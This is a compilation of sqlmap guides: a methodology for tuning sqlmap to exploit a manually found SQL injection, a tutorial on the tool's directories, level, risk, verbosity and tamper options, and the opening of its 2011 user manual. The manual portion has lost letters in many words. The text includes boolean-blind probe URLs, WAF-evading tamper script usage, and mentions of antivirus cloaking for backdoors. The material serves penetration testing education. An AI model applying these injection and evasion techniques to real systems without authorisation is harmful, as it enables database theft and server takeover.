Develop the manual exploit to the point where a POC for the best applicable exploitation technique exists. For a UNION SELECT vulnerability, this means you want to discover the number of columns in the UNION, and perhaps also the datatypes of each column (numeric, text, date, etc). For a boolean blind, you will want to be able to trigger different pages responses for True and False conditions, and determine how you could differentiate the True response from the False. For a time based blind, you want to get a response to delay for a given period of seconds based on the success or failure of some comparison you make, etc. This step will also include working out whether any specific characters are restricted by some sort of filter or other application issue, and hence are unusable in performing the injection.

Run sqlmap, configuring the backend database type (--dbms), Operating System (--os), and technique (--technique) options to specifically target the manually discovered issue. Set the parameter (-p)  option as well if the injection is in a URL or POST data parameter, or use other options such as the injection point asterisk (*) as appropriate to tell sqlmap exactly where the injection is located. This helps focus the detection process, minimising requests sent and time taken by ignoring non-vulnerable parameters and payloads that target other databases or are associated with unwanted injection techniques. You may also need to provide proxy details, cookies or other authentication options, CSRF management options, safe URL settings to avoid lockouts, etc as appropriate, to ensure that sqlmap can correctly send and receive HTTP requests and responses. If you have already created a manual injection POC in a separate tool you should already know all the correct settings to use for this purpose.  Leave all other options at the default. I do all my manual testing using Burp Suite Professional, so I use the CO2 plugin and its SQLMapper component to quickly set the relevant command line options.  From this point on in the process, as soon as you get sqlmap to detect the vulnerability, you can skip the remaining steps (hopefully thats obvious). 

Run the detection again, however this time use the -v3 verbose option on so you can see the payloads being sent.  Scroll through the output, looking for an injection string thats similar in layout to the POC developed earlier, which will cause the response you require. At this point you may see the names of likely looking payloads that are not being sent here because the --level or --risk settings are too low. If so, raise these values and try again and see if you can find an appropriate payload that comes as close as possible to what you need.

If at this point you still do not see a payload that looks like it will be able to provide the output needed to make the injection succeed, you will need to write your own. Pick an example from the xml file named after the appropriate injection technique thats as close as possible to what you need, and modify as required.  The earlier section on custom test payloads contains references that help describe this process, and a future post in this series will also have a specific example.

Once sqlmap is sending a payload that is logically similar to your POC, the goal is to now tweak the relevant sqlmap options to get the request syntactically correct for the injection.  At this point you will want to set the --test-filter option in order to send only your chosen payload, and try and determine what needs to change with the payload to make it work. By "work" I mean that you must be creating injected queries that are syntactically correct and the results must not involve database errors, displayed to you or otherwise, UNLESS you are doing error based injection and that error is displayed to you and contains your chosen content. This troubleshooting may involve taking the payload from the sqlmap verbose output and pasting it into your manual testing tool (i.e. Burp Suite Professional's Repeater) to see if it returns a syntactically correct result. Sometimes however, you can just eyeball it and tell where there are some obvious issues. The next step provides guidance on how to fix syntax issues.

If the payload being sent is resulting in a SQL query that is NOT syntactically correct, there are 3 primary reasons for this.  Work out which issue (or combination of issues) is causing the problem, and work to resolve these as discussed below before moving on to the next step.

The first possible reason is that the prefix and suffix have been set incorrectly (either manually by you or automatically by sqlmap). You know this is the case if the text used at the start of the payload to break into the injection, or the text at the end used to terminate it, are syntactically different from your POC. Correctly set the suffix and prefix options to fix this - the right values should be easy to identify as they will be included in your manual POC. Be aware here that certain test payloads are configured to place random values at the start of the payload output. If you set the --prefix option and don't see the configured string at the very start of the payload output you are using in sqlmap's verbose output, you know that the payload configuration itself is the cause (specifically, the where option in the payload configuration), which is the second possible reason.
Second, the definition of the test payload itself is causing an error for some reason. I have seen the sqlmap default payloads break in some cases, but the most likely way for this to occur is when you have written the payload yourself. If the text or logic or the placement of the random values used by sqlmap in the meat of the payload is causing the issue, the problem might be with the definition of the test payload (or you might be focusing on using the wrong payload and another one you have overlooked is more appropriate). Modify the payload, try a different one, or create a your own custom new one to fix this.
Third, there is some sort of filter implemented in the space between when you send the request and when the resultant query reaches the database that is causing an otherwise syntactically correct payload to be rejected. This is where tamper scripts can be used to (hopefully) filter out or replace the offending characters. Don't forget to bump your verbosity setting to -v4 in order to see HTTP requests in the output if you need to troubleshoot these. You can either use one of the existing tamper scripts (if a suitable one exists) or write your own. If the filtering is particularly prohibitive, you may need to consider writing a payload that makes use of inventive SQL to avoid your given bad patterns.

Once your queries are syntactically correct, the next step is ensuring that sqlmap can correctly interpret the results it is receiving (and, in the case of second order injections, that it is receiving the correct results at all!). Setting aside second-order injections for the moment (we will cover this in more detail in a future example), sqlmap is generally pretty good at this for all of its techniques other than boolean blind injection. For these, you will often need to tell it how to distinguish True from False responses. This is where the detection options such as --string, --not-string and --regex discussed earlier come into play - use these to help sqlmap identify the appropriate responses.

sqlmap repository structure
Let’s start from the bottom up:

sqlmapapi.py: sqlmap can be used as an API, which is something we’ll look at later in this course, but this serves as the entry point to enable and control our API

sqlmap.py: this, on the other hand, is the entry point for using sqlmap itself (python sqlmap.py -h)

sqlmap.conf: this is the configuration file for sqlmap’s options, so this is where we can modify some of sqlmap’s default configuration values in a more permanent way than typing them out in the terminal each time we issue a command

Next we have README, LICENSE, Travis CI (Continuous Integration), pylint code analysis file, and git files

thirdparty: this is where we can see the 3rd party tools needed for certain sqlmap functionality (ie: identywaf used to identify WAFs)

tamper: these are our tamper scripts, which are used to evade security controls (such as WAFs, IPSs, etc). There are over 60 scripts included by default, but we can also add our own

plugins: these are generic and DBMS-specific sets of plugins which are used by sqlmap to connect, fingerprint, enumerate, takover, etc… so these are very important functions

lib: another set of really important functions is in /lib. These are the libraries used by sqlmap, and it contains controller functions, core functions, parse functions, request functions, takeover functions, techniques functions (blind, dns, error, union), and utils (utilities) functions

extra: extra contains additional functionality that doesn’t quite fit in lib or plugins. For example, there is a vulnserver that we can use to test sqlmap functionality. There’s also a cloak script that can be used to encrypt and compress binary files in order to evade anti viruses. When using backdoors through sqlmap, sqlmap automatically takes care of that for you. But if you needed to manually cloak backdoors or other files that could be blocked by detection software, you could manually use cloak.py.

doc: this contains general files about sqlmap’s authors, its changelog, a thanks file for contributors, a list of third parties and their licenses, copyrights, etc, and translations for different languages other than english.

data: finally, we have data which contains a lot of templates and text documents that sqlmap uses extensively during its operations.

html is simply a demo page
procs contains SQL snippets used on target systems, and so they’re separated by DBMS
shell contains backdoor and stager shell scripts, useful for the takeover phase
txt contains common columns, tables, files, outputs, keywords, user-agents, and wordlists, all useful for brute-force operations, fingerprinting, bypassing basic security controls, and masking sqlmap’s identity
udf stands for user-defined functions, and this contains user-defined function binary files which can be used in the takeover phase to try and create our own functions in the target DBMS, which could help us assume control over that database.
xml is where you will find payloads for each technique. You will also find something called banner which sqlmap uses to identify which DBMS we’re dealing with, and more specifically, what versions are installed. These files also help identify what webserver is in place, and what languages as well as settings power the application(s) that we’re targeting. We also have:
boundaries.xml: contains a list of boundaries that are used in SQL queries
errors.xml: contains known error messages separated by DBMS
queries.xml: contains the correct syntax for each DBMS for various operations (ie: cast, length, isnull, delimiter, etc)
.github is just a convention folder used to place GitHub related information inside of it, like the Code of Conduct, Contribution guidelines, how to donate to the project, and the format to follow for opening bug reports or feature requests.

All of this data, all of those functions, and all of those configuration files serve a purpose. They’re there to give sqlmap its functionality. Understanding how its structured and how it works together is important for a number of reasons:

As you become a more advanced user of sqlmap, you can extend its functionality. You can add more tamper scripts. You can change payloads. You can change default configurations, etc…
If you run across an issue, you can try to troubleshoot yourself before opening an issue ticket, and then if you find a solution, you can propose that solution to the authors of sqlmap
As changes get pushed to sqlmap, and as you update your version, you can keep track of changes and get a better understanding of what’s been added, fixed, or removed
Now that we looked at the entire repo and how it’s structured, let’s narrow it down a bit more to some of the most useful directories.

2. Important and useful sqlmap directories
sqlmap useful directories cheat sheet
Click for full resolution
We already briefly mentioned most of these in the prior section, but let’s take a closer look.

/tamper/
This is where you’ll find tamper scripts, which are used primarily to bypass WAFs and evade security controls.

Using these scripts is simple, as you can use the --tamper option:

--tamper="random,appendnullbyte,between,base64encode"
Code language: JavaScript (javascript)
This would instruct sqlmap to use all of the scripts separated by commas.

/data/txt/
This directory contains text files that sqlmap uses quite extensively during its operations:

common-columns
common-files
common-outputs
common-tables
keywords
smalldict
user-agents
wordlists
These files are used for everything from randomizing user-agent header values, to brute-forcing common column/file/table names, to guessing values for optimization.

You can add/remove values in these text files to your heart’s content.

/data/xml/payloads/
Curious to see what payloads sqlmap is using with its fingerprinting, enumeration, and takeover actions? This is where you’ll find them.

You can also add/remove payloads to your heart’s content.

The payloads are broken down by SQL injection technique:

boolean_blind
error_based
inline_query
stacked_queries
time_blind
union_query
/sqlmap.conf
This is the heart of sqlmap’s configuration. This file includes defaults for all options that need defaults to function, which means you can change these defaults either directly in this file, or via the terminal when you issue commands. Note that if you update a default in this conf file and then issue a different value via the terminal, the terminal value will take precedence.

/output/
This directory (usually located at /home/kali/.local/share/sqlmap/output/ if you use kali) is where results from sqlmap commands get stored which you can then explore and review. This is helpful when you need to share results in your reports and with developers, or if you want to perform additional analysis with 3rd party tools.

/history/
This directory (usually located at /home/kali/.local/share/sqlmap/history/ if you use kali) is where a SQL file gets generated and updated automatically by sqlmap as you issue commands. This essentially acts as a SQLite database which sqlmap can pull from to remember actions and results.

3. Test –levels and the impact they will have on your commands
sqlmap levels cheat sheet
Click for full resolution
This option decides what tests are performed and what tests aren’t performed. Let’s take a look at each level. (You can view payloads and which get triggered at which levels here.)

Level 1
This is the most basic level. sqlmap tests all GET and POST parameters. So regardless of the level that we choose, GET and POST parameters will always be tested by default, unless we specifically tell sqlmap not to.

Level 2
This level starts to also look at HTTP Cookie headers for SQL injection vulnerability.

We can also set cookie headers manually with --cookie=COOKIE, and we can use --param-exclude=EXCLUDE to bypass testing of certain cookies that match the given regular expression. We can also skip testing the Cookie headers by using --skip="cookies" or by using -p and not including cookies, even if we have this level enabled.

Examples:

sqlmap -u 'http://localhost:8440/" --level=2
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --param-exclude="PHPSESSID"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." --skip="cookies"
sqlmap -u 'http://localhost:8440/" --level=2 --cookie="PHPSESSID=..." -p "id"
Level 3
This level adds 2 new types of headers into the mix:

HTTP User-Agent header
HTTP Referer header
So by including this level, we are now testing for level 1 + level 2 + level 3.

Level 4
Level 4 seems to mostly implement more payloads for certain types of techniques, not necessarily new headers to test as compared to the other levels. For example:

Boolean-blind level 4 includes, as some examples (there are others):
MySQL boolean-based blind – Parameter replace (MAKE_SET)
MySQL boolean-based blind – Parameter replace (ELT)
MySQL boolean-based blind – Parameter replace (bool*int)
PostgreSQL boolean-based blind – Parameter replace (original value)
Microsoft SQL Server/Sybase boolean-based blind – Parameter replace (original value)
etc… (filter by <level>4</level>)
Error-based
Stacked queries
Time blind
Union query
Inline query (only includes tests for levels 1-3)
Level 5
Finally, the highest level adds HTTP Host headers to test for SQL injections, as well as additional checks that we can also look for in each respective file.

One thing to keep in mind as you increase the levels, you will be increasing the number of requests, so if you set level 5, it will take significantly longer than if you choose level 2.

1: Always (<100 requests)
2: Try a bit harder (100-200 requests)
3: Good number of requests (200-500 requests)
4: Extensive test (500-1000 requests)
5: You have plenty of time (>1000 requests)
Source: https://github.com/sqlmapproject/sqlmap/blob/master/data/xml/payloads/boolean_blind.xml#L21
Code language: HTTP (http)
4. –risk levels and the impact they will have on your commands
sqlmap risk levels cheat sheet
Click for full resolution
This option is similar to the --level option, but instead of dictating which headers and techniques to include in tests, this option looks at the risk levels.

Certain payloads that can be used to test for SQL injections can be destructive, because they can make modifications to databases and their entries, or they can take down databases by using resource-intensive queries. In some situations, that could be unacceptable since it would go outside of your testing scope or cause damage to a business. That’s why the authors of sqlmap added 3 levels.

Level 1
The first level, level 1, is intended to not cause any damage to databases and applications. It is the least offensive of all levels, so it’s a great place to start and is the default value.

Level 2
The 2nd level starts to add heavy time-based SQL injection queries. This can slow down the database or even potentially take it down. So be careful when using this risk level.

Level 3
The 3rd and final risk level adds OR based SQL injection tests. The reason this is in the highest risk level is because injecting OR payloads in certain queries can actually lead to updates of entries in database tables. Changing data in the database is never what you would want unless you are testing a throw-away environment and database. If you were to do that in a production environment, it could have disastrous consequences.

Only use this risk level if you know what you are doing, if you have explicit permissions, and if everyone is on the same page as to what this risk level does.

To get a comprehensive list of which payloads get executed at which risk levels, you can again take a look at all of the default payloads that sqlmap uses here. You can also add your own or make modifications, by the way, as you become a more advanced user of sqlmap, and to customize it to your needs or your client’s needs.

5. Verbosity levels for troubleshooting and to see what sqlmap is doing under the hood
sqlmap verbosity levels cheat sheet
Click for full resolution
Verbosity is used to control how much information sqlmap outputs when we’re using the tool. Some people may want more feedback from the tool to understand what’s going on and to debug, while others may find all of that extra information unnecessary.

By default, sqlmap uses a verbosity level of 1, which they define as Show Python tracebacks, errors, and critical messages from level 0, plus Show information and warning messages

So each of these levels stack on top of each other:

0: Show only Python tracebacks, error and critical messages.
1: Show also information and warning messages.
2: Show also debug messages.
3: Show also payloads injected.
4: Show also HTTP requests.
5: Show also HTTP response headers.
6: Show also HTTP response page content.
Again, this is personal preference and it depends on what you’re doing, but level 2 is recommended for the detection and takeover phases.

Level 3 is recommended if you want to see what payloads are being injected and if you want to be able to share those payloads with your developers or your client in order to show them exactly what worked and what didn’t work.

Otherwise, levels 4 – 6 include HTTP requests information, response headers, and response page content, which would be a lot of information to sift through, so it’s not recommended unless you absolutely need to know that information.

One more note to take here is that you can also replace the numeric values for this option (ie: -v 4) with the corresponding number of vs (ie: -vvvv)

sqlmap -v 4 
sqlmap -vvvv
You can also further filter results with grep:

sqlmap -v 4 | grep <filter>
Code language: HTML, XML (xml)
This option has to be used with other mandatory options, so if you try to set it by itself, it will give you an error and ask you to provide another mandatory option. This means you have to set the verbosity level for each of your commands, unless you set it in the sqlmap configuration file.

6. List of sqlmap’s Tamper scripts and what they do

Click for full resolution
sqlmap, by default, does very little to obfuscate payloads. Obfuscation, if you’re not familiar with the term already, is the act of hiding the true intention of our payload, which is a technique used to try and evade detection because it makes the payload deliberately difficult to understand. Just by looking at it, you wouldn’t be able to tell that it’s malicious.

This could be a problem if you’re trying to evade WAFs, IPSs, or other types of security controls and monitoring systems.

So in cases that you are trying to bypass input validation, or trying to slip through a Web Application Firewall, you may want to try and use --tamper options.

With this option, you can pass in a number of different values that are all separated by commas, and these values will load different tampering scripts. You can also create your own tamper scripts.

For example:

--tamper="between,randomcase"
Code language: JavaScript (javascript)
You can also use this command to list all of the tamper scripts in your terminal:

--list-tampers
Code language: PHP (php)
If we navigate to /tamper on GitHub, we’ll find a list of all the included tamper scripts. From there, we can click on one and see what the code does, since these are all python scripts. To make it a little bit easier, you can download the cheat sheet above which includes all of the available tamper scripts and a brief description of what each one does.

sqlmap user's manual

by Bernardo Damele A. G. , Miroslav Stampar                                            version 0.9, April 10, 2011


This document is the user's manual to use sqlmap .




Contents
1 Introduction                                                                                                    4
   1.1 Requirements . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .      4
   1.2 Scenario . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .    5
        1.2.1 Detect and exploit a SQL injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . .         5
        1.2.2 Direct connection to the database management system . . . . . . . . . . . . . . . . . .              6
   1.3 Techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .      6
   1.4 Demo . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .      7

2 Features                                                                                                        7
   2.1 Generic features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .      7
   2.2 Fingerprint and enumeration features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .        9
   2.3 Takeover features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .     9

3 History                                                                                                         10
   3.1 2011 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
   3.2 2010 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10
   3.3 2009 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 11
   3.4 2008 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
   3.5 2007 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12
   3.6 2006 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 13

4 Download and update                                                                                             13

5 Usage                                                                                                           13
   5.1 Output verbosity . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
   5.2 Target . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
        5.2.1 Target URL . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 17
        5.2.2 Parse targets from Burp or WebScarab proxy logs . . . . . . . . . . . . . . . . . . . . 17
        5.2.3 Load HTTP request from a le . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
        5.2.4 Process Google dork results as target addresses . . . . . . . . . . . . . . . . . . . . . . 18
        5.2.5 Load options from a conguration INI le . . . . . . . . . . . . . . . . . . . . . . . . . 18
CONTENTS                                                                                                       2


 5.3 Request . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
      5.3.1 HTTP data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
      5.3.2 HTTP Cookie header . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 18
      5.3.3 HTTP User-Agent header . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 19
      5.3.4 HTTP Referer header . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
      5.3.5 Extra HTTP headers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
      5.3.6 HTTP protocol authentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
      5.3.7 HTTP protocol certicate authentication . . . . . . . . . . . . . . . . . . . . . . . . . 20
      5.3.8 HTTP(S) proxy . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
      5.3.9 Delay between each HTTP request . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21
      5.3.10 Seconds to wait before timeout connection . . . . . . . . . . . . . . . . . . . . . . . . . 21
      5.3.11 Maximum number of retries when the HTTP connection timeouts . . . . . . . . . . . 21
      5.3.12 Filtering targets from provided proxy log using regular expression . . . . . . . . . . . 21
      5.3.13 Avoid your session to be destroyed after too many unsuccessful requests . . . . . . . . 21
 5.4 Optimization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
      5.4.1 Bundle optimization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
      5.4.2 Output prediction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
      5.4.3 HTTP Keep-Alive . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
      5.4.4 HTTP NULL connection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
      5.4.5 Concurrent HTTP(S) requests . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
 5.5 Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
      5.5.1 Testable parameter(s) . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 23
      5.5.2 Force the database management system name . . . . . . . . . . . . . . . . . . . . . . . 23
      5.5.3 Force the database management system operating system name . . . . . . . . . . . . . 24
      5.5.4 Custom injection payload . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
      5.5.5 Tamper injection data . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
 5.6 Detection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
      5.6.1 Level . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
      5.6.2 Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 26
      5.6.3 Page comparison . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27
 5.7 Techniques . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27
      5.7.1 SQL injection techniques to test for . . . . . . . . . . . . . . . . . . . . . . . . . . . . 27
      5.7.2 Seconds to delay the DBMS response for time-based blind SQL injection . . . . . . . . 28
      5.7.3 Number of columns in UNION query SQL injection . . . . . . . . . . . . . . . . . . . 28
      5.7.4 Character to use to test for UNION query SQL injection . . . . . . . . . . . . . . . . . 28
 5.8 Fingerprint . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
      5.8.1 Extensive database management system ngerprint . . . . . . . . . . . . . . . . . . . . 28
CONTENTS                                                                                                      3


 5.9 Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29
      5.9.1 Banner . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29
      5.9.2 Session user . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29
      5.9.3 Current database . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 29
      5.9.4 Detect whether or not the session user is a database administrator . . . . . . . . . . . 29
      5.9.5 List database management system users . . . . . . . . . . . . . . . . . . . . . . . . . . 29
      5.9.6 List and crack database management system users password hashes . . . . . . . . . . 29
      5.9.7 List database management system users privileges . . . . . . . . . . . . . . . . . . . . 30
      5.9.8 List database management system users roles . . . . . . . . . . . . . . . . . . . . . . . 31
      5.9.9 List database management system's databases . . . . . . . . . . . . . . . . . . . . . . 31
      5.9.10 Enumerate database's tables . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
      5.9.11 Enumerate database table columns . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
      5.9.12 Dump database table entries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32
      5.9.13 Dump all databases tables entries . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33
      5.9.14 Search for columns, tables or databases . . . . . . . . . . . . . . . . . . . . . . . . . . 33
      5.9.15 Run custom SQL statement . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33
 5.10 Brute force . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34
      5.10.1 Brute force tables names . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 34
      5.10.2 Brute force columns names . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35
 5.11 User-dened function injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 35
      5.11.1 Inject custom user-dened functions (UDF) . . . . . . . . . . . . . . . . . . . . . . . . 35
 5.12 File system access . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36
      5.12.1 Read a le from the database server's le system . . . . . . . . . . . . . . . . . . . . . 36
      5.12.2 Upload a le to the database server's le system . . . . . . . . . . . . . . . . . . . . . 36
 5.13 Operating system takeover . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 37
      5.13.1 Run arbitrary operating system command . . . . . . . . . . . . . . . . . . . . . . . . . 37
      5.13.2 Out-of-band stateful connection: Meterpreter & friends . . . . . . . . . . . . . . . . . 38
 5.14 Windows registry access . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
      5.14.1 Read a Windows registry key value . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
      5.14.2 Write a Windows registry key value . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
      5.14.3 Delete a Windows registry key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
      5.14.4 Auxiliary registry switches . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
 5.15 General . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42
      5.15.1 Log HTTP(s) trac to a textual le . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42
      5.15.2 Session le: save and resume data retrieved . . . . . . . . . . . . . . . . . . . . . . . . 42
      5.15.3 Flush session le . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 42
      5.15.4 Ignores query results stored in session le . . . . . . . . . . . . . . . . . . . . . . . . . 43
1. Introduction                                                                                                  4


         5.15.5 Estimated time of arrival . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43
         5.15.6 Update sqlmap . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43
         5.15.7 Save options in a conguration INI le . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
         5.15.8 Act in non-interactive mode . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
    5.16 Miscellaneous . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
         5.16.1 Alert when a SQL injection is detected . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
         5.16.2 IDS detection testing of injection payloads . . . . . . . . . . . . . . . . . . . . . . . . . 44
         5.16.3 Cleanup the DBMS from sqlmap specic UDF(s) and table(s) . . . . . . . . . . . . . . 44
         5.16.4 Parse and test forms' input elds . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 44
         5.16.5 Use Google dork results from specied page number . . . . . . . . . . . . . . . . . . . 45
         5.16.6 Display page rank (PR) for Google dork results . . . . . . . . . . . . . . . . . . . . . . 45
         5.16.7 Parse DBMS error messages from response pages . . . . . . . . . . . . . . . . . . . . . 45
         5.16.8 Replicate dumped data into a sqlite3 database . . . . . . . . . . . . . . . . . . . . . . 45
         5.16.9 Simple wizard interface for beginner users . . . . . . . . . . . . . . . . . . . . . . . . . 45

6 License and copyright                                                                                         45

7 Disclaimer                                                                                                    45

8 Authors                                                                                                       46


1     Introduction
sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL
injection aws and taking over of database servers. It comes with a kick-ass detection engine, many niche
features for the ultimate penetration tester and a broad range of switches lasting from database ngerprinting,
over data fetching from the database, to accessing the underlying le system and executing commands on
the operating system via out-of-band connections.


1.1 Requirements
sqlmap is developed in Python , a dynamic object-oriented interpreted programming language. This makes
the tool independent from the operating system. It only requires the Python interpreter version 2 equal or
higher than 2.6. The interpreter is freely downloadable from its ocial site . To make it even easier, many
GNU/Linux distributions come out of the box with Python interpreter installed and other Unices and Mac
OSX too provide it packaged in their formats and ready to be installed. Windows users can download and
install the Python setup-ready installer for x86, AMD64 and Itanium too.
sqlmap relies on the Metasploit Framework for some of its post-exploitation takeover features. You need to
grab a copy of it from the download page - the required version is 3.5 or higher. For the ICMP tunneling
out-of-band takeover technique, sqlmap requires Impacket library too.
If you are willing to connect directly to a database server (-d switch), without passing via a web application,
you need to install Python bindings for the database management system that you are going to attack:
1. Introduction                                                                                              5


   • Firebird: python-kinterbasdb .

   • Microsoft Access: python-pyodbc .

   • Microsoft SQL Server: python-pymssql .

   • MySQL: python-mysqldb .

   • Oracle: python cx_Oracle .

   • PostgreSQL: python-psycopg2 .

   • SQLite: python-pysqlite2 .

   • Sybase: python-pymssql .

If you plan to attack a web application behind NTLM authentication or use the sqlmap update functionality
(--update switch) you need to install respectively python-ntlm and python-svn libraries.
Optionally, if you are running sqlmap on Windows, you may wish to install PyReadline library to be able to
take advantage of the sqlmap TAB completion and history support features in the SQL shell and OS shell.
Note that these functionalities are available natively by Python standard readline library on other operating
systems.
You can also choose to install Psyco library to eventually speed up the sqlmap algorithmic operations.


1.2 Scenario
1.2.1 Detect and exploit a SQL injection

Let's say that you are auditing a web application and found a web page that accepts dynamic user-provided
values on GET or POST parameters or HTTP Cookie values or HTTP User-Agent header value. You now
want to test if these are aected by a SQL injection vulnerability, and if so, exploit them to retrieve as much
information as possible out of the web application's back-end database management system or even be able
to access the underlying le system and operating system.
In a simple world, consider that the target url is:

     http://192.168.136.131/sqlmap/mysql/get_int.php?id=1


Assume that:

     http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=1


is the same page as the original one and:

     http://192.168.136.131/sqlmap/mysql/get_int.php?id=1+AND+1=2


diers from the original one, it means that you are in front of a SQL injection vulnerability in the id
GET parameter of the index.php web application page which means that potentially no IDS/IPS, no web
application rewall, no parameters' value sanitization is performed on the server-side before sending the SQL
statement to the back-end database management system the web application relies on.
This is a quite common aw in dynamic content web applications and it does not depend upon the back-
end database management system nor on the web application programming language: it is a programmer
1. Introduction                                                                                             6


code's security aw. The Open Web Application Security Project rated on 2010 in their OWASP Top Ten
survey this vulnerability as the most common and important web application vulnerability along with other
injection aws.
Back to the scenario, probably the SQL SELECT statement into get_int.php has a syntax similar to the
following SQL query, in pseudo PHP code:

     $query = "SELECT [column(s) name] FROM [table name] WHERE id=" .         $_REQUEST['id'];


As you can see, appending any other syntatically valid SQL condition after a value for id such condition
will take place when the web application passes the query to the back-end database management system
that executes it, that is why the condition id=1 AND 1=1 is valid (True ) and returns the same page as the
original one, with the same content. This is the case of a boolean-based blind SQL injection vulnerability.
However, sqlmap is able to detect any type of SQL injection and adapt its work-ow accordingly. Read
below for further details.
Moreover, in this simple and easy to inject scenario it would be also possible to append, not just one or more
valid SQL condition(s), but also stacked SQL queries, for instance something like [...]&id=1; ANOTHER
SQL QUERY# if the web application technology supports stacked queries , also known as multiple statements .
Now that you found this SQL injection vulnerable parameter, you can exploit it by manipulating the id
parameter value in the HTTP request.
There exist many resources on the Net explaining in depth how to prevent, detect and exploit SQL injection
vulnerabilities in web application and it is recommended to read them if you are not familiar with the issue
before going ahead with sqlmap.
Passing the original address, http://192.168.136.131/sqlmap/mysql/get_int.php?id=1 to sqlmap, the
tool will automatically:

